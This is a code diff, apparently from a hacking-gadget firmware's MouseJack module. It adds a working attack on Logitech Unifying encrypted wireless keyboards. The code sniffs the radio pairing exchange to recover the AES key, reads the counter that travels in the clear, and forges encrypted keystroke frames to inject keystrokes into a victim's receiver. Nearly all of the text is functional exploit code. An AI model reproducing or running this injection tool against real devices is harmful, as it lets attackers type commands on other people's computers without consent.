@@ -16,6 +16,7 @@
 #include "core/sd_functions.h"
 #include <SD.h>
 #include <globals.h>
+#include <mbedtls/aes.h>
 
 // ── Tuning Constants ────────────────────────────────────────────
 static constexpr int SCAN_TRIES_PER_CH = 6;
@@ -308,11 +309,22 @@ mj_fingerprintPayload(const uint8_t *payload, uint8_t size, const uint8_t *addr,
     //   size==5  && payload[1]==0x40 → wake-up
     if (payload[0] == 0x00) {
         bool isLogitech = false;
+        MjDeviceType type = MJ_DEVICE_LOGITECH;
         if (size == 10 && (payload[1] == 0xC2 || payload[1] == 0x4F)) isLogitech = true;
-        if (size == 22 && payload[1] == 0xD3) isLogitech = true;
+        if (size == 22 && payload[1] == 0xD3) {
+            isLogitech = true;
+            type = MJ_DEVICE_LOGITECH_CRYPT;
+        }
         if (size == 5 && payload[1] == 0x40) isLogitech = true;
         if (isLogitech) {
-            mj_addTarget(addr, 5, channel, MJ_DEVICE_LOGITECH);
+            int idx = mj_addTarget(addr, 5, channel, type);
+            if (idx >= 0 && type == MJ_DEVICE_LOGITECH_CRYPT) {
+                // Counter rides in the clear; resume above it on injection
+                mj_targets[idx].lastCounter = ((uint32_t)payload[10] << 24) |
+                                              ((uint32_t)payload[11] << 16) |
+                                              ((uint32_t)payload[12] << 8) | payload[13];
+                mj_targets[idx].counterSeen = true;
+            }
             return;
         }
     }
@@ -385,10 +397,83 @@ static void mj_transmitReliable(const uint8_t *frame, uint8_t len) {
     }
 }
 
+// ── Logitech Encrypted (Bastille #11/#12 chain, CVE-2019-13052 class) ──
+// The "encrypted" Unifying protocol keys its AES-128 with values transmitted
+// in the clear during pairing. Ported from decrazyo/unifying (MIT):
+//   - AES key = XNOR-permuted 16-byte proto key built from pairing frames
+//   - Keystroke frame (22 B): 00 D3 <AES-CTR 8 B> <counter BE32> 00*7 <cksum>
+//   - CTR keystream block = AES-ECB(key, nonce_prefix||counter||nonce_suffix)
+static const uint8_t MJ_LOGI_PAIR_ADDR[5] = {0x75, 0xA5, 0xDC, 0x0A, 0xBB}; // RF24 register order (logical BB:0A:DC:A5:75)
+static const uint8_t MJ_LOGI_PAIR_CHANNELS[] = {5, 8, 17, 32, 35, 41, 44, 62, 65, 71, 74};
+static const uint8_t MJ_LOGI_NONCE_PREFIX[7] = {0x04, 0x14, 0x1D, 0x1F, 0x27, 0x28, 0x0D};
+static const uint8_t MJ_LOGI_NONCE_SUFFIX[5] = {0x0A, 0x0D, 0x13, 0x26, 0x0E};
+static const uint8_t MJ_LOGI_KEY_INDEX[16] = {
+    0x07, 0x01, 0x00, 0x03, 0x0A, 0x02, 0x09, 0x0E, 0x08, 0x06, 0x0C, 0x05, 0x0D, 0x0F, 0x04, 0x0B};
+static const uint8_t MJ_LOGI_KEY_MASK[16] = {
+    0xFF, 0x00, 0xFF, 0xFF, 0xFF, 0x00, 0xAA, 0xFF, 0xFF, 0xFF, 0x00, 0xFF, 0xFF, 0xAA, 0xFF, 0xFF};
+static const uint8_t MJ_LOGI_PLAIN_FLAG = 0xC9; // receiver-side decryption check
+
+static uint8_t mj_logiAesKey[16];
+static uint8_t mj_logiKeyAddr[5]; // assigned device address, RF24 register order
+static uint32_t mj_logiCounter = 1;
+static bool mj_logiKeyValid = false;
+
+// Wire checksum: two's complement of the byte sum over the frame minus its checksum byte
+static uint8_t mj_logiChecksum(const uint8_t *p, uint8_t len) {
+    uint8_t c = 0;
+    for (uint8_t i = 0; i < len; i++) c -= p[i];
+    return c;
+}
+
+static void mj_logiDeriveKey(uint8_t *out, const uint8_t *proto) {
+    for (uint8_t i = 0; i < 16; i++) out[i] = (uint8_t) ~(proto[MJ_LOGI_KEY_INDEX[i]] ^ MJ_LOGI_KEY_MASK[i]);
+}
+
+// Build + transmit one encrypted keystroke frame (press or release)
+static void mj_logCryptTransmit(const MjTarget &target, uint8_t meta, const uint8_t *keys, uint8_t keysLen) {
+    uint8_t plain[8] = {0};
+    plain[0] = meta;
+    for (uint8_t i = 0; i < keysLen && i < 6; i++) plain[1 + i] = keys[i];
+    plain[7] = MJ_LOGI_PLAIN_FLAG;
+
+    uint8_t iv[16] = {0};
+    memcpy(iv, MJ_LOGI_NONCE_PREFIX, sizeof(MJ_LOGI_NONCE_PREFIX));
+    iv[7] = (mj_logiCounter >> 24) & 0xFF;
+    iv[8] = (mj_logiCounter >> 16) & 0xFF;
+    iv[9] = (mj_logiCounter >> 8) & 0xFF;
+    iv[10] = mj_logiCounter & 0xFF;
+    memcpy(iv + 11, MJ_LOGI_NONCE_SUFFIX, sizeof(MJ_LOGI_NONCE_SUFFIX));
+
+    mbedtls_aes_context ctx;
+    mbedtls_aes_init(&ctx);
+    uint8_t ks[16];
+    if (mbedtls_aes_setkey_enc(&ctx, mj_logiAesKey, 128) != 0 ||
+        mbedtls_aes_crypt_ecb(&ctx, MBEDTLS_AES_ENCRYPT, iv, ks) != 0) {
+        mbedtls_aes_free(&ctx);
+        return;
+    }
+    mbedtls_aes_free(&ctx);
+
+    for (uint8_t i = 0; i < 8; i++) plain[i] ^= ks[i];
+
+    uint8_t frame[22] = {0};
+    frame[0] = 0x00;
+    frame[1] = 0xD3;
+    memcpy(frame + 2, plain, 8);
+    frame[10] = (mj_logiCounter >> 24) & 0xFF;
+    frame[11] = (mj_logiCounter >> 16) & 0xFF;
+    frame[12] = (mj_logiCounter >> 8) & 0xFF;
+    frame[13] = mj_logiCounter & 0xFF;
+    frame[21] = mj_logiChecksum(frame, 21);
+    mj_logiCounter++;
+
+    mj_transmitReliable(frame, sizeof(frame));
+}
+
 static void mj_logTransmit(const MjTarget &target, uint8_t meta, const uint8_t *keys, uint8_t keysLen);
 
 static void mj_logitechWake(const MjTarget &target) {
-    if (target.type != MJ_DEVICE_LOGITECH) return;
+    if (target.type != MJ_DEVICE_LOGITECH && target.type != MJ_DEVICE_LOGITECH_CRYPT) return;
 
     // Common Logitech wake/sleep-timer packet seen in MouseJack tooling
     uint8_t hello[10] = {0x00, 0x4F, 0x00, 0x04, 0xB0, 0x10, 0x00, 0x00, 0x00, 0xED};
@@ -461,6 +546,12 @@ static void mj_sendKeystroke(const MjTarget &target, uint8_t modifier, uint8_t k
         delay(ATTACK_INTER_KEY_MS);
         uint8_t none = MJ_KEY_NONE;
         mj_logTransmit(target, MJ_MOD_NONE, &none, 1);
+    } else if (target.type == MJ_DEVICE_LOGITECH_CRYPT) {
+        if (!mj_logiKeyValid) return; // caller must have captured a pairing key
+        mj_logCryptTransmit(target, modifier, &keycode, 1);
+        delay(ATTACK_INTER_KEY_MS);
+        uint8_t none = MJ_KEY_NONE;
+        mj_logCryptTransmit(target, MJ_MOD_NONE, &none, 1);
     }
 }
 
@@ -567,6 +658,7 @@ static const char *mj_getTypeLabel(MjDeviceType type) {
         case MJ_DEVICE_MICROSOFT: return "MS";
         case MJ_DEVICE_MS_CRYPT: return "MS*";
         case MJ_DEVICE_LOGITECH: return "LG";
+        case MJ_DEVICE_LOGITECH_CRYPT: return "LG*";
         default: return "??";
     }
 }
@@ -735,6 +827,13 @@ static void mj_setupTxForTarget(const MjTarget &target) {
     // Set payload size based on device type
     if (target.type == MJ_DEVICE_MICROSOFT || target.type == MJ_DEVICE_MS_CRYPT) {
         NRFradio.setPayloadSize(19);
+    } else if (target.type == MJ_DEVICE_LOGITECH_CRYPT) {
+        NRFradio.setPayloadSize(22);
+        // Resume above the last AES counter seen on air (it rides in the clear)
+        if (target.counterSeen) {
+            uint32_t next = target.lastCounter + 1;
+            if ((int32_t)(next - mj_logiCounter) > 0) mj_logiCounter = next;
+        }
     } else {
         NRFradio.setPayloadSize(10);
     }
@@ -767,6 +866,11 @@ static void mj_attackString(int targetIndex) {
     tft.drawCentreString(preview, tftWidth / 2, cy, 1);
 
     if (!mj_validateNrfMode()) return;
+
+    if (target.type == MJ_DEVICE_LOGITECH_CRYPT && !mj_logiKeyValid) {
+        displayInfo("Capture a pairing key first:\nNRF24 > MouseJack > Sniff Pair Key", true);
+        return;
+    }
 
     if (!nrf_start(mj_nrfMode)) {
         displayError("NRF24 not found", true);
@@ -929,6 +1033,155 @@ static void mj_targetListMenu() {
     }
 }
 
+// ── Sniff a Logitech encrypted pairing → recover the AES key ────
+// Pairing exchange (addr BB:0A:DC:A5:75, moves to the assigned addr after step 1):
+//   0x5F/01 device→dongle : id, device product_id (BE16 @9)
+//   0x51/01 dongle→device : id echo, assigned address (5 B @3, logical MSB-first), receiver product_id (BE16 @9)
+//   0x5F/02 device→dongle : device_crypto (BE32 @3)
+//   0x50/02 dongle→device : receiver_crypto (BE32 @3)
+// proto key = base_addr[0:4] + devPID + rcvPID + devCrypto + rcvCrypto; AES key = XNOR-permuted proto
+static void mj_sniffPairKeyMenu() {
+    if (!mj_validateNrfMode()) return;
+    if (!nrf_start(mj_nrfMode)) {
+        displayError("NRF24 not found", true);
+        return;
+    }
+
+    NRFradio.setAutoAck(false);
+    NRFradio.setDataRate(RF24_2MBPS);
+    NRFradio.setAddressWidth(5);
+    NRFradio.setPayloadSize(22);
+    NRFradio.setCRCLength(RF24_CRC_16);
+    NRFradio.setRetries(0, 0);
+    NRFradio.flush_rx();
+    NRFradio.flush_tx();
+
+    uint8_t pairId = 0;
+    uint16_t devProdId = 0, rcvProdId = 0;
+    uint8_t assignedLogical[5] = {0};
+    uint8_t assignedReg[5] = {0};
+    uint32_t devCrypto = 0, rcvCrypto = 0;
+    bool haveId = false, haveProdId = false, haveAddr = false;
+    bool haveDevCrypto = false, haveRcvCrypto = false;
+    bool phase2 = false;
+
+    uint8_t pairAddr[5];
+    memcpy(pairAddr, MJ_LOGI_PAIR_ADDR, 5);
+    NRFradio.openReadingPipe(1, pairAddr);
+    NRFradio.setChannel(MJ_LOGI_PAIR_CHANNELS[0]);
+    NRFradio.startListening();
+
+    drawMainBorderWithTitle("LOGI PAIR SNIFF");
+    padprintln("Trigger pairing on the");
+    padprintln("target device/dongle");
+    padprintln("now (pairing button).");
+    padprintln("");
+
+    uint8_t chIdx = 0;
+    unsigned long lastHop = 0, lastDraw = 0;
+    unsigned long start = millis();
+    const unsigned long SNIFF_TIMEOUT_MS = 120000UL;
+    int statusY = tftHeight / 2;
+
+    while (millis() - start < SNIFF_TIMEOUT_MS) {
+        if (check(EscPress)) break;
+
+        if (millis() - lastHop > 30) {
+            NRFradio.setChannel(MJ_LOGI_PAIR_CHANNELS[chIdx % sizeof(MJ_LOGI_PAIR_CHANNELS)]);
+            chIdx++;
+            lastHop = millis();
+        }
+
+        if (NRFradio.available()) {
+            uint8_t pl[22];
+            NRFradio.read(pl, sizeof(pl));
+
+            if (mj_logiChecksum(pl, 21) != pl[21]) continue;
+
+            uint8_t f = pl[1], step = pl[2];
+            if (!phase2 && f == 0x5F && step == 0x01) {
+                pairId = pl[0];
+                devProdId = ((uint16_t)pl[9] << 8) | pl[10];
+                haveId = true;
+                haveProdId = true;
+            } else if (!phase2 && f == 0x51 && step == 0x01 && haveId && pl[0] == pairId) {
+                memcpy(assignedLogical, &pl[3], 5);
+                for (uint8_t i = 0; i < 5; i++) assignedReg[i] = assignedLogical[4 - i];
+                rcvProdId = ((uint16_t)pl[9] << 8) | pl[10];
+                haveAddr = true;
+                // Exchange moves to the assigned address after step 1
+                NRFradio.stopListening();
+                NRFradio.openReadingPipe(1, assignedReg);
+                NRFradio.startListening();
+                phase2 = true;
+            } else if (phase2 && f == 0x5F && step == 0x02) {
+                devCrypto = ((uint32_t)pl[3] << 24) | ((uint32_t)pl[4] << 16) |
+                            ((uint32_t)pl[5] << 8) | pl[6];
+                haveDevCrypto = true;
+            } else if (phase2 && f == 0x50 && step == 0x02) {
+                rcvCrypto = ((uint32_t)pl[3] << 24) | ((uint32_t)pl[4] << 16) |
+                            ((uint32_t)pl[5] << 8) | pl[6];
+                haveRcvCrypto = true;
+            }
+        }
+
+        // Live capture status (1=prod-id, 2=assigned addr, 3=dev crypto, 4=rcv crypto)
+        if (millis() - lastDraw > 200) {
+            tft.setTextSize(FP);
+            tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
+            tft.fillRect(7, statusY, tftWidth - 14, FP * LH, bruceConfig.bgColor);
+            tft.drawCentreString(
+                String("1:") + (haveProdId ? "OK" : "..") + " 2:" + (haveAddr ? "OK" : "..") + " 3:" +
+                    (haveDevCrypto ? "OK" : "..") + " 4:" + (haveRcvCrypto ? "OK" : ".."),
+                tftWidth / 2, statusY, 1
+            );
+            lastDraw = millis();
+        }
+
+        vTaskDelay(pdMS_TO_TICKS(1));
+
+        if (haveProdId && haveAddr && haveDevCrypto && haveRcvCrypto) break;
+    }
+
+    NRFradio.stopListening();
+    NRFradio.powerDown();
+
+    if (haveProdId && haveAddr && haveDevCrypto && haveRcvCrypto) {
+        uint8_t proto[16] = {0};
+        memcpy(proto, assignedLogical, 4); // base address = first 4 bytes (logical MSB-first)
+        proto[4] = (devProdId >> 8) & 0xFF;
+        proto[5] = devProdId & 0xFF;
+        proto[6] = (rcvProdId >> 8) & 0xFF;
+        proto[7] = rcvProdId & 0xFF;
+        proto[8] = (devCrypto >> 24) & 0xFF;
+        proto[9] = (devCrypto >> 16) & 0xFF;
+        proto[10] = (devCrypto >> 8) & 0xFF;
+        proto[11] = devCrypto & 0xFF;
+        proto[12] = (rcvCrypto >> 24) & 0xFF;
+        proto[13] = (rcvCrypto >> 16) & 0xFF;
+        proto[14] = (rcvCrypto >> 8) & 0xFF;
+        proto[15] = rcvCrypto & 0xFF;
+
+        mj_logiDeriveKey(mj_logiAesKey, proto);
+        memcpy(mj_logiKeyAddr, assignedReg, 5);
+        mj_logiKeyValid = true;
+
+        String keyHex = "";
+        char hex[3];
+        for (uint8_t i = 0; i < 16; i++) {
+            snprintf(hex, sizeof(hex), "%02X", mj_logiAesKey[i]);
+            keyHex += hex;
+        }
+        Serial.printf("[MJ] Logi AES key: %s (addr %02X:%02X:%02X:%02X:%02X)\n",
+                      keyHex.c_str(),
+                      mj_logiKeyAddr[0], mj_logiKeyAddr[1], mj_logiKeyAddr[2], mj_logiKeyAddr[3],
+                      mj_logiKeyAddr[4]);
+        displayInfo("AES key captured:\n" + keyHex, true);
+    } else {
+        displayInfo("No pairing captured", true);
+    }
+}
+
 // ══════════════════════════════════════════════════════════════════
 // ═══════════════ MAIN MOUSEJACK MENU ══════════════════════════
 // ══════════════════════════════════════════════════════════════════
@@ -940,6 +1193,7 @@ void nrf_mousejack() {
              NRF24_MODE selected = nrf_setMode();
              if (selected != NRF_MODE_DISABLED) mj_nrfMode = selected;
          }                                             },
+        {"Sniff Pair Key", mj_sniffPairKeyMenu},
         {"Scan Devices",
          [=]() {
              if (mj_scan()) {
